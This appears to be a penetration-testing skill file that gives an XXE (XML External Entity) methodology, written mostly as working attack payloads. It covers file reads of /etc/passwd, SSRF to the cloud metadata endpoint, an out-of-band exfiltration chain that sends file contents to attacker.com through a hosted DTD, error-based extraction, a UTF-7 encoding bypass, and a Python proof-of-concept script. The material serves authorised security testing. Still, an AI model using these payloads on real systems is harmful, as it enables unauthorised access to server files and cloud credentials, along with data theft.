---
name: xxe
description: XML External Entity injection testing methodology
version: 1.0.0
tags: [injection, xml, A03:2021]
---

# XXE Testing Methodology

## Overview
XXE allows attackers to interfere with XML processing, potentially reading files, performing SSRF, or DoS.

## Types
1. **In-band XXE**: Direct response with data
2. **Blind XXE**: Use out-of-band callbacks
3. **Error-based XXE**: Extract data via error messages

## Payloads

### Basic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>
```

### Blind XXE (OOB)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
<foo>test</foo>

<!-- xxe.dtd on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%send;
```

### Error-based
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

### UTF-7 Encoding Bypass
```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-foo+AD4-
```

## PoC Template
```python
import requests

def test_xxe(url):
    payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>'''
    
    headers = {'Content-Type': 'application/xml'}
    r = requests.post(url, data=payload, headers=headers)
    
    if 'root:' in r.text:
        print("[+] XXE file read successful!")
        return True
    return False
```

## Impact
- Read server files
- SSRF to internal services
- Denial of Service (Billion Laughs)
- Port scanning
